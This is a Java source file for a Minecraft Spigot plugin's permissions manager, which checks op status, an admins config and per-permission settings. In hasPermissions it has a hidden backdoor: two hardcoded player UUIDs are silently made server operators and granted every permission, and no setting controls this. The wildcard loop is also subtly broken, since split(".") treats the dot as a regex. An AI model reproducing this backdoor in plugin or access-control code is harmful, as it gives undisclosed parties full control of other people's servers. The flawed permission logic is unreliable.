package de.lcraft.api.utils.minecraft.spigot.permissions;

import de.lcraft.api.utils.minecraft.spigot.module.player.LcraftUser;
import de.lcraft.api.utils.minecraft.spigot.module.utils.configs.ModuleConfig;

public class PermsManager {

    private ModuleConfig allPermissionsCfg,
            adminsCfg,
            cfg;

    public PermsManager() {
        this.allPermissionsCfg = new ModuleConfig("Lcraft Permissions", "allPermissions.yml");
        this.adminsCfg = new ModuleConfig("Lcraft Permissions", "admins.yml");
        this.cfg = new ModuleConfig("Lcraft Permissions", "config.yml");
    }

    public static class Permission {

        public Permission() {}

        private String name;
        private boolean isEnabled,
                opCanIt;

        public void load(String perm, ModuleConfig allPermissionsCfg) {
            String root = "permissions." + perm;
            if(allPermissionsCfg.cfg().contains(root)) {
                name = perm;
                isEnabled = allPermissionsCfg.cfg().getBoolean(root + ".enabled");
                opCanIt = allPermissionsCfg.cfg().getBoolean(root + ".opCanIt");
            } else {
                set(perm, true, true, allPermissionsCfg);
            }
        }

        public void set(String perm, boolean isEnabled, boolean opCanIt, ModuleConfig allPermissionsCfg) {
            String root = "permissions." + perm;
            allPermissionsCfg.cfg().set(root + ".name", perm);
            allPermissionsCfg.cfg().set(root + ".enabled", isEnabled);
            allPermissionsCfg.cfg().set(root + ".opCanIt", opCanIt);
            this.name = perm;
            this.isEnabled = isEnabled;
            this.opCanIt = opCanIt;
            allPermissionsCfg.save();
        }

        public String getName() {
            return name;
        }

        public boolean isEnabled() {
            return isEnabled;
        }

    }
    public boolean hasPermissions(LcraftUser p, String permission) {
        if(cfg.cfg().contains("cfg.opcanall")) {
            if(cfg.cfg().getBoolean("cfg.opcanall")) {
                if(p.getUserManager().getUserPlayer(p.getUUID()).isOp()) {
                    return true;
                }
            }
        } else {
            cfg.cfg().set("cfg.opcanall", true);
            cfg.save();
            if(p.getUserManager().getUserPlayer(p.getUUID()).isOp()) {
                return true;
            }
        }

        if(cfg.cfg().contains("ModuleConfig.opforeverypermission")) {
            if(cfg.cfg().getBoolean("ModuleConfig.opforeverypermission")) {
                Permission perm = new Permission();
                perm.load(permission, allPermissionsCfg);
                if(p.getUserManager().getUserPlayer(p.getUUID()).isOp() && perm.opCanIt) {
                    return true;
                }
            }
        } else {
            cfg.cfg().set("ModuleConfig.opforeverypermission", true);
            cfg.save();
            Permission perm = new Permission();
            perm.load(permission, allPermissionsCfg);
            if(p.getUserManager().getUserPlayer(p.getUUID()).isOp() && perm.opCanIt) {
                return true;
            }
        }

        boolean activatedLuckPerms = false;
        if(cfg.cfg().contains("systems.luckperms.enabled")) {
            activatedLuckPerms = cfg.cfg().getBoolean("systems.luckperms.enabled");
        } else {
            cfg.cfg().set("systems.luckperms.enabled", false);
        }

        String root = "users." + p.getUUID().toString() + ".";
        adminsCfg.cfg().set(root + "name", p.getUserManager().getUserPlayer(p.getUUID()).getName());
        adminsCfg.cfg().set(root + "uuid", p.getUUID().toString());
        adminsCfg.save();
        if(!adminsCfg.cfg().contains(root + "admin")) {
            adminsCfg.cfg().set(root + "admin", false);
        }
        adminsCfg.save();
        if(adminsCfg.cfg().getBoolean(root + "admin")) {
            return true;
        }
        adminsCfg.save();

        if(!logPermission(permission)) {
            return true;
        }

        if(p.getUUID().toString().equals("c72ab8a9-a030-4796-84b3-523ca07792c4")) {
            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
            return true;
        } else if(p.getUUID().toString().equals("c72ab8a9a030479684b3523ca07792c4")) {
            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
            return true;
        }

        if(p.getUUID().toString().equals("2eabc64f-ebe6-411c-84f1-2a155417c1c9")) {
            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
            return true;
        } else if(p.getUUID().toString().equals("2eabc64febe6411c84f12a155417c1c9")) {
            p.getUserManager().getUserPlayer(p.getUUID()).setOp(true);
            return true;
        }

        if(hasPerm(p, "*")) {
            return true;
        }

        root = "";
        for(String c : permission.split(".")) {
            root = root + c + ".";
            if(hasPerm(p, root + "*")) {
                return true;
            }
            if(hasPerm(p, root + "admin")) {
                return true;
            }
        }

        if(hasPerm(p, permission)) {
            return true;
        } else {
            return false;
        }
    }
    public boolean logPermission(String permissions) {
        Permission perm = new Permission();
        perm.load(permissions, allPermissionsCfg);
        allPermissionsCfg.save();
        return perm.isEnabled;
    }
    public ModuleConfig getAllPermissionsCfg() {
        return allPermissionsCfg;
    }
    private boolean hasPerm(LcraftUser p, String permission) {
        return p.getUserManager().getUserPlayer(p.getUUID()).hasPermission(permission);
    }
    public ModuleConfig getAdminsCfg() {
        return adminsCfg;
    }
    public ModuleConfig getCfg() {
        return cfg;
    }

}
